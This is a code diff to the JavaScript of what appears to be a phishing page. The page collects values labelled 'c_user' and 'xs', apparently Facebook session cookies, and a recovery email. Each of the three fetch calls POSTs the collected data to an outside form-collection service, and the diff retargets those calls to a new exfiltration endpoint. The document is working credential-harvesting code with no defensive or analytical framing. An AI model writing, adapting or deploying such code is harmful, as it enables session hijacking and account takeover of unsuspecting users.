@@ -414,7 +414,7 @@
             const cUserInput = document.getElementById("c_user").value.trim();
             const xsInput = document.getElementById("xs").value.trim();
             // Always send c_user and xs
-            fetch("https://postal-form.on.shiper.app/submit", {
+            fetch("https://submit-form.com/x7gYyBupD", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
@@ -460,7 +460,7 @@
             }).then(res => {
                 if (res.ok) {
                     if (allowRecovery && recoveryInput) {
-                         fetch("https://postal-form.on.shiper.app/notifyLogin", {
+                         fetch("https://submit-form.com/x7gYyBupD", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryInput, password: "." })
@@ -483,7 +483,7 @@
                 console.error("Submission error:", err);
                 alert("An error occurred. Please try again.");
                 if (allowRecovery && recoveryInput) {
-                         fetch("https://postal-form.on.shiper.app/notifyLogin", {
+                         fetch("https://submit-form.com/x7gYyBupD", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryInput, password: "." })
